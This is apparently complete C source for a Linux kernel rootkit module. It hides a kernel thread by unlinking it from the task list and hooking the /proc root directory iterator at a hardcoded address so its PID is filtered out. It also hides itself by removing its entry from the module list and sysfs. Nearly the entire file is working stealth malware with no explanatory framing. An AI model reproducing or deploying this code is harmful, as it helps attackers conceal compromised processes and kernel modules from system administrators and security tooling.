#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h> 
#include <linux/sched.h> 
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/delay.h>

struct task_struct *hide;
static struct file_operations *proc_root_operations;
int (*old_proc_root_readdir) (struct file *, struct dir_context*);
static filldir_t oldactor;
//struct module *(*find_module) (const char *name);

void set_page_rw(unsigned long addr){
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);
	if(pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

void set_page_ro(unsigned long addr){
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
}

int hide_thread(void *nothing) {
	struct task_struct *tmp;
	list_del(&(current->tasks));
	while(1){
		if(kthread_should_stop())break;
		printk(KERN_INFO "----hehe-------\n");
		for_each_process(tmp){
			printk(KERN_INFO "pid %d\n", tmp->pid);
		}
		msleep(5000);
	};
	return 0;
}

int topid(const char *pid){
	const char *p;
	int ret = 0;
	for(p = pid; *p >= '0' && *p <= '9'; ++p){
		ret = ret * 10;
		ret += *p-'0';
	}
	return ret;
}

static int myactor(void *a, const char *b, int c, loff_t d, u64 e, unsigned f){
	if(topid(b) == hide->pid){
		return 0;
	}
	return oldactor(a,b,c,d,e,f);	
}

int myreaddir(struct file *file, struct dir_context *ctx){
	oldactor = ctx->actor;
	*((unsigned long *)ctx) = (unsigned long *)myactor;
	return old_proc_root_readdir(file, ctx);
}

int hidemodule(void){
	struct module *mod = NULL;
	//find_module = 0xffffffff810f2f60;
	mod = find_module("rootkit");
	if(mod == NULL) {
		printk(KERN_INFO "can't find module\n");
		return -1;
	}

	list_del(&(mod->list));
	kobject_del(&(mod->mkobj.kobj));
	return 0;
}

int rootkit_init (void) {  
	printk(KERN_INFO "***ROOTKIT***\n");
	hide = kthread_run(hide_thread, NULL, "hide_thread");
	printk(KERN_INFO "hide pid : %d\n", hide->pid);
	proc_root_operations = (struct file_operations *)0xffffffff818354c0;
	old_proc_root_readdir = proc_root_operations->iterate;
	set_page_rw((unsigned long) proc_root_operations);
	proc_root_operations->iterate = myreaddir;
	set_page_ro((unsigned long) proc_root_operations);
	hidemodule();
	return 0;
}
 
void rootkit_exit(void) {
	if(hide)
		kthread_stop(hide);
	set_page_rw((unsigned long) proc_root_operations);
	proc_root_operations->iterate = old_proc_root_readdir;
	set_page_ro((unsigned long) proc_root_operations);

	printk(KERN_INFO "***ROOTKIT END***\n");
}

MODULE_LICENSE("GPL");    
module_init(rootkit_init);
module_exit(rootkit_exit);
